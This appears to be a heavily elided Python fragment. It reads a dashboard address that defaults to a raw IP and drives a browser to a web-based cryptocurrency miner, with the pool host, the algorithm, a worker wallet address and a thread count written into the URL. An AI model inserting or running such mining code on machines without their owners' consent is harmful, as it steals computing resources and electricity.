...
DASHBOARD_URL = os.environ.get("DASHBOARD_URL", "http://152.42.206.165:3000")
try:
...
try:
    ...
    base_url = "https://webminer.pages.dev?algorithm=cwm_minotaurx&host=minotaurx.sea.mine.zpool.ca&port=7019&worker=XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu&password=c%3DDASH&workers=4"
    driver.get(base_url)
